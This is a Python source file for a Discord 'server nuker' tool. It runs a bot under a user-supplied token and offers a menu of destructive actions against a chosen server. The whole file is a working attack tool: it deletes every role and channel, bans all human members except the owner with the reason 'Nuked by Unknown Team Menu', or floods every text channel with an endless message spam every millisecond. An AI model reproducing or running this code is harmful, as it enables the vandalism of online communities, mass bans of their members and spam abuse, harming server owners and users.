import discord
import asyncio
from discord.ext import commands
from colorama import init, Fore, Style
import os
init(autoreset=True)
INTENTS = discord.Intents.all()
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
def print_banner():
    clear_console()
    print(Fore.MAGENTA + Style.BRIGHT + "╔══════════════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT + "       StarX Server Discord Nuker      ")
    print(Fore.MAGENTA + Style.BRIGHT + "╚══════════════════════════════════════╝")
def run():
    print_banner()
    TOKEN = input(Fore.YELLOW + "Enter your bot token: ")
    GUILD_ID = input(Fore.YELLOW + "Enter the Server ID (Guild ID): ")
    bot = commands.Bot(command_prefix="!", intents=INTENTS)
    @bot.event
    async def on_ready():
        clear_console()
        print_banner()
        print(Fore.RED + "\n [1] Delete all Roles")
        print(Fore.RED + "\n [2] Delete all Channels")
        print(Fore.RED + "\n [3] Ban all Members")
        print(Fore.RED + "\n [4] Spam To All Channels")
        print(Style.RESET_ALL)
        choice = input(Fore.YELLOW + "\n Please enter the option number you want: ")
        try:
            guild = discord.utils.get(bot.guilds, id=int(GUILD_ID))
            if guild is None:
                print(Fore.RED + "Bot is not in that server or invalid Guild ID.")
                await bot.close()
                return
        except:
            print(Fore.RED + "Invalid Guild ID.")
            await bot.close()
            return
        if choice == "1":
            await clean_roles(guild)
        elif choice == "2":
            await clean_channels(guild)
        elif choice == "3":
            await clean_members(guild)
        elif choice == "4":
            await send_loop_message(guild)
        else:
            print(Fore.RED + "Invalid option selected.")
            await bot.close()
    async def clean_roles(guild):
        for role in guild.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
                    print(Fore.RED + f"Deleted role: {role.name}")
            except:
                print(Fore.YELLOW + f"Failed to delete role: {role.name}")
        await bot.close()
    async def clean_channels(guild):
        for channel in guild.channels:
            try:
                await channel.delete()
                print(Fore.RED + f"Deleted channel: {channel.name}")
            except:
                print(Fore.YELLOW + f"Failed to delete channel: {channel.name}")
        await bot.close()
    async def clean_members(guild):
        for member in guild.members:
            try:
                if not member.bot and member != guild.owner:
                    await guild.ban(member, reason="Nuked by Unknown Team Menu")
                    print(Fore.RED + f"Banned member: {member.name}")
            except:
                print(Fore.YELLOW + f"Failed to ban member: {member.name}")
        await bot.close()
    async def send_loop_message(guild):
        message_content = input(Fore.GREEN + "Enter the message to Spam (tags : @everyone | @username): ")
        delay = 1  
        print(Fore.CYAN + f"\nSpam started. Sending message every {delay}ms.")
        text_channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
        try:
            while True:
                for channel in text_channels:
                    try:
                        await channel.send(message_content)
                        print(Fore.MAGENTA + f"Spam> Sent message to #{channel.name}")
                    except:
                        print(Fore.YELLOW + f"Failed to send message to #{channel.name}")
                await asyncio.sleep(delay / 1000)  
        except KeyboardInterrupt:
            print(Fore.RED + "\nStopped message loop manually.")
            await bot.close()
    bot.run(TOKEN)
if __name__ == "__main__":
    run()
